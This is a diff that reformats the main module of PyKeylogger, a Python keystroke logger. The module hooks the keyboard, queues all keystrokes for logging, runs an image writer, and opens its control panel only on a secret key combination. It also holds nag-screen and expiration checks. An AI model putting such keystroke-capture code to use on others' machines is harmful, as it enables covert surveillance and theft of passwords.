@@ -52,11 +52,13 @@ from Queue import Empty # to avoid some weird exceptions on exit
 import threading
 
 class KeyLogger:
-    ''' Captures all keystrokes, puts events in Queue for later processing
-    by the LogWriter class
-    '''
-    def __init__(self): 
-        
+    '''Captures all keystrokes, enqueue events.
+    
+       Puts keystrokes events in queue for later processing by the LogWriter
+       class.
+       
+       '''
+    def __init__(self):
         self.ParseOptions() # stored in self.cmdoptions
         self.ParseConfigFile() # stored in self.settings
         self.ParseControlKey()
@@ -64,11 +66,17 @@ class KeyLogger:
         self.process_settings()
         self.q_logwriter = Queue.Queue(0)
         self.q_imagewriter = Queue.Queue(0)
-        self.lw = LogWriter(self.settings, self.cmdoptions, self.q_logwriter)
-        self.iw = ImageWriter(self.settings, self.cmdoptions, self.q_imagewriter)
+        self.lw = LogWriter(self.settings,
+                            self.cmdoptions,
+                            self.q_logwriter)
+        self.iw = ImageWriter(self.settings,
+                              self.cmdoptions,
+                              self.q_imagewriter)
         if os.name == 'posix':
-            self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
-        
+            self.hashchecker = ControlKeyMonitor(self.cmdoptions,
+                                                 self.lw,
+                                                 self,
+                                                 self.ControlKeyHash)
         self.hm = hooklib.HookManager()
         
         if self.settings['General']['Hook Keyboard'] == True:
@@ -96,35 +104,40 @@ class KeyLogger:
             self.hm.start()
         
     def process_settings(self):
-        '''Process some settings values to correct for user input errors, 
-        and to detect proper full path of the log directory.
+        '''Sanitizes user input and detects full path of the log directory.
         
-        We can change things in the settings configobj with impunity here,
-        since the control panel process get a fresh read of settings from file
-        before doing anything.
-        '''
-        
+           We can change things in the settings configobj with impunity here,
+           since the control panel process get a fresh read of settings from
+           file before doing anything.
+           
+           '''
+        log_dir = os.path.normpath(self.settings['General']['Log Directory'])
         if os.path.isabs(self.settings['General']['Log Directory']):
-            self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
+            self.settings['General']['Log Directory'] = log_dir
         else:
-            self.settings['General']['Log Directory'] = os.path.join(myutils.get_main_dir(), os.path.normpath(self.settings['General']['Log Directory']))
+            self.settings['General']['Log Directory'] = \
+               os.path.join(myutils.get_main_dir(), log_dir)
         
-        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")    #regexp filter for the non-allowed characters in windows filenames.
-        self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
-        self.settings['General']['System Log'] = self.filter.sub(r'__',self.settings['General']['System Log'])
+        # Regexp filter for the non-allowed characters in windows filenames.
+        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
+        self.settings['General']['Log File'] = \
+           self.filter.sub(r'__',self.settings['General']['Log File'])
+        self.settings['General']['System Log'] = \
+           self.filter.sub(r'__',self.settings['General']['System Log'])
         
         # todo: also want to run imagesdirectoryname (tbc) through self.filter 
         
     def ParseControlKey(self):
-        self.ControlKeyHash = ControlKeyHash(self.settings['General']['Control Key'])
+        self.ControlKeyHash = \
+           ControlKeyHash(self.settings['General']['Control Key'])
         
     def OnKeyDownEvent(self, event):
-        '''This function is the stuff that's supposed to happen when a key is pressed.
-        Puts the event in queue, 
-        Updates the control key combo status,
-        And passes the event on to the system.
-        '''
+        '''Called when a key is pressed.
         
+           Puts the event in queue, updates the control key combo status,
+           and passes the event on to the system.
+           
+           '''
         self.q_logwriter.put(event)
         
         self.ControlKeyHash.update(event)
@@ -132,20 +145,19 @@ class KeyLogger:
         if self.cmdoptions.debug:
                 self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
                 
-        # have to open the panel from main thread on windows, otherwise it hangs.
-        # possibly due to some interaction with the python message pump and tkinter?
-        # 
-        # on linux, on the other hand, doing it from a separate worker thread is a must
-        # since the pyxhook module blocks until panel is closed, so we do it with the 
-        # hashchecker thread instead.
-        if os.name == 'nt': 
+        # We have to open the panel from main thread on windows, otherwise it
+        # hangs. This is possibly due to some interaction with the python
+        # message pump and tkinter.
+        # On linux, on the other hand, doing it from a separate worker thread
+        # is a must since the pyxhook module blocks until panel is closed,
+        # so we do it with the hashchecker thread instead.
+        if os.name == 'nt':
             if self.ControlKeyHash.check():
                 if not self.panel:
                     self.lw.PrintDebug("starting panel")
                     self.panel = True
                     self.ControlKeyHash.reset()
                     PyKeyloggerControlPanel(self.cmdoptions, self)
-        
         return True
     
     def OnKeyUpEvent(self,event):
@@ -157,9 +169,7 @@ class KeyLogger:
         return True
     
     def stop(self):
-        '''Exit cleanly.
-        '''
-        
+        '''Exit cleanly.'''
         if os.name == 'posix':
             self.hm.cancel()
             self.hashchecker.cancel()
@@ -170,87 +180,119 @@ class KeyLogger:
         sys.exit()
     
     def ParseOptions(self):
-        '''Read command line options
-        '''
-        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
-        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
-        parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
-        parser.add_option("-v", "--configval", action="store", dest="configval", help="filename of the configuration validation file. [default: %default]")
+        '''Read command line options.'''
+        version_str = version.description + " version " + version.version + \
+                      " (" + version.url + ")."
+        parser = OptionParser(version=version_str)
+        parser.add_option("-d", "--debug",
+           action="store_true", dest="debug",
+           help="debug mode (print output to console instead of the log file) "
+                "[default: %default]")
+        parser.add_option("-c", "--configfile",
+           action="store", dest="configfile",
+           help="filename of the configuration ini file. [default: %default]")
+        parser.add_option("-v", "--configval",
+           action="store", dest="configval",
+           help="filename of the configuration validation file. "
+                "[default: %default]")
         
-        parser.set_defaults(debug=False, 
-                            configfile=version.name + ".ini", 
+        parser.set_defaults(debug=False,
+                            configfile=version.name + ".ini",
                             configval=version.name + ".val")
         
-        (self.cmdoptions, args) = parser.parse_args()
+        self.cmdoptions, args = parser.parse_args()
     
     def ParseConfigFile(self):
-        '''Read config file options from .ini file.
-        Filename as specified by "--configfile" option, default "pykeylogger.ini".
-        Validation file specified by "--configval" option, default "pykeylogger.val".
+        '''Reads config file options from .ini file.
         
-        Give detailed error box and exit if validation on the config file fails.
-        '''
+           Filename as specified by "--configfile" option,
+           default "pykeylogger.ini".
+           
+           Validation file specified by "--configval" option,
+           default "pykeylogger.val".
+           
+           Give detailed error box and exit if validation on the config file
+           fails.
+           
+           '''
         
         if not os.path.isabs(self.cmdoptions.configfile):
-            self.cmdoptions.configfile = os.path.join(myutils.get_main_dir(), self.cmdoptions.configfile)
+            self.cmdoptions.configfile = os.path.join(
+                myutils.get_main_dir(), self.cmdoptions.configfile)
         if not os.path.isabs(self.cmdoptions.configval):
-            self.cmdoptions.configval = os.path.join(myutils.get_main_dir(), self.cmdoptions.configval)
+            self.cmdoptions.configval = os.path.join(
+                myutils.get_main_dir(), self.cmdoptions.configval)
             
-        self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
+        self.settings = ConfigObj(self.cmdoptions.configfile,
+                                  configspec=self.cmdoptions.configval,
+                                  list_values=False)
 
         # validate the config file
-        errortext="Some of your input contains errors. Detailed error output below.\n\n"
+        errortext = "Some of your input contains errors. " + \
+                    "Detailed error output below.\n\n"
         val = Validator()
         valresult = self.settings.validate(val, preserve_errors=True)
+        error_tpl = "Error in item \"%s\": %s\n"
         if valresult != True:
             for section in valresult.keys():
                 if valresult[section] != True:
                     sectionval = valresult[section]
                     for key in sectionval.keys():
                         if sectionval[key] != True:
-                            errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
-            tkMessageBox.showerror("Errors in config file. Exiting.", errortext)
+                            errortext += error_tpl % \
+                               (str(key), str(sectionval[key]))
+            tkMessageBox.showerror("Errors in config file. Exiting.",
+                                   errortext)
             sys.exit()
         
     def NagscreenLogic(self):
-        '''Figure out whether the nagscreen should be shown, and if so, show it.
-        '''
+        '''Show the nagscreen (or not).'''
         
-        # Congratulations, you have found the nag control. See, that wasn't so hard, was it? :)
-        # 
-        # While I have deliberately made it easy to stop all this nagging and expiration stuff here,
-        # and you are quite entitled to doing just that, I would like to take this final moment 
-        # and encourage you once more to support the PyKeylogger project by making a donation. 
+        # Congratulations, you have found the nag control.
+        # See, that wasn't so hard, was it? :)
+        # While I have deliberately made it easy to stop all this nagging and
+        # expiration stuff here, and you are quite entitled to doing just that,
+        # I would like to take this final moment and encourage you once more to
+        # support the PyKeylogger project by making a donation.
         
         # Set this to False to get rid of all nagging.
         NagMe = True
         
         if NagMe == True:
             # first, show the support screen
-            root=Tkinter.Tk()
+            root = Tkinter.Tk()
             root.geometry("100x100+200+200")
-            warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
+            warn = SupportScreen(root, title="Please Support PyKeylogger",
+                                 rootx_offset=-20, rooty_offset=-35)
             root.destroy()
             del(warn)
             
-            #set the timer if first use
-            if myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']) == "firstuse":
-                self.settings['General']['Usage Time Flag NoDisplay'] = myutils.password_obfuscate(str(time.time()))
+            # set the timer if first use
+            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            if myutils.password_recover(utfnd) == "firstuse":
+                self.settings['General']['Usage Time Flag NoDisplay'] = \
+                   myutils.password_obfuscate(str(time.time()))
                 self.settings.write()
             
             # then, see if we have "expired"
-            if abs(time.time() - float(myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']))) > 345600: #4 days
+            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            if abs(time.time() - float(myutils.password_recover(utfnd))) > \
+               3600 * 24 * 4:
                 root = Tkinter.Tk()
                 root.geometry("100x100+200+200")
-                warn=ExpirationScreen(root, title="PyKeylogger Has Expired", rootx_offset=-20, rooty_offset=-35)
+                warn = ExpirationScreen(root, title="PyKeylogger Has Expired",
+                                        rootx_offset=-20, rooty_offset=-35)
                 root.destroy()
                 del(warn)
                 sys.exit()
 
 class ControlKeyHash:
-    '''Encapsulates the control key dictionary which is used to keep
-    track of whether the control key combo has been pressed.
-    '''
+    '''Encapsulates the control key dictionary.
+       
+       This dictionary is used to keep track of whether the control key combo
+       has been pressed.
+       
+       '''
     def __init__(self, controlkeysetting):
         
         #~ lin_win_dict = {'Alt_L':'Lmenu',
@@ -276,28 +318,35 @@ class ControlKeyHash:
         
         self.controlKeyList = controlkeysetting.split(';')
         
-        # capitalize all items for greater tolerance of variant user inputs
-        self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
-        # remove duplicates
+        # Capitalize all items for greater tolerance of variant user inputs.
+        self.controlKeyList = \
+           [item.capitalize() for item in self.controlKeyList]
+        # Remove duplicates.
         self.controlKeyList = list(set(self.controlKeyList))
         
-        # translate linux versions of key names to windows, or vice versa,
+        # Translate linux versions of key names to windows, or vice versa,
         # depending on what platform we are on.
         if os.name == 'nt':
             for item in self.controlKeyList:
                 if item in lin_win_dict.keys():
-                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
+                    self.controlKeyList[self.controlKeyList.index(item)] = \
+                       lin_win_dict[item]
         elif os.name == 'posix':
             for item in self.controlKeyList:
                 if item in win_lin_dict.keys():
-                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
+                    self.controlKeyList[self.controlKeyList.index(item)] = \
+                       lin_win_dict[item]
         
-        self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
+        self.controlKeyHash = dict(zip(
+           self.controlKeyList,
+           [False for item in self.controlKeyList]))
     
     def update(self, event):
-        if event.MessageName == 'key down' and event.Key.capitalize() in self.controlKeyHash.keys():
+        if event.MessageName == 'key down' and \
+           event.Key.capitalize() in self.controlKeyHash.keys():
             self.controlKeyHash[event.Key.capitalize()] = True
-        if event.MessageName == 'key up' and event.Key.capitalize() in self.controlKeyHash.keys():
+        if event.MessageName == 'key up' and \
+           event.Key.capitalize() in self.controlKeyHash.keys():
             self.controlKeyHash[event.Key.capitalize()] = False
     
     def reset(self):
@@ -305,7 +354,7 @@ class ControlKeyHash:
             self.controlKeyHash[key] = False
     
     def check(self):
-        if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
+        if self.controlKeyHash.values() == [True] * len(self.controlKeyHash):
             return True
         else:
             return False
@@ -314,9 +363,12 @@ class ControlKeyHash:
         return str(self.controlKeyHash)
 
 class ControlKeyMonitor(threading.Thread):
-    '''Polls the control key hash status periodically, to see if
-    the control key combo has been pressed. Brings up control panel if it has.
-    '''
+    '''Polls the control key hash status periodically.
+       
+       Done to see if the control key combo has been pressed.
+       Brings up control panel if it has.
+       
+       '''
     def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
@@ -345,8 +397,8 @@ class ControlKeyMonitor(threading.Thread):
         
 
 if __name__ == '__main__':
-    
     kl = KeyLogger()
     kl.start()
     
-    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
+    # If you want to change keylogger behavior from defaults,
+    # modify the .ini file. Also try '-h' for list of command line options.
